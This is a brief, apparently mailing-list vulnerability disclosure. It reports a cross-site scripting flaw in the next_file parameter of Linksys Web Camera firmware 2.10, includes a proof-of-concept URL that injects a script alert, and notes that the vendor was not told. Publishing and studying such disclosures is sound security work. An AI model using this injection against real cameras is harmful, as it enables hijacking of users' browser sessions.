Subject: Linksys Web Camera Cross-site Scripting Vuln




Linksys Web Camera version 2.10 (only tested with 2.10) is vulnerable to a cross-site scripting vulnerability.

Example: http://www.host.com/main.cgi?next_file=poop&lt;script&gt;alert('scriptX :P');&lt;/script&gt;

Linksys was not notified (I didnt notify them about the file inclusion vuln either..)
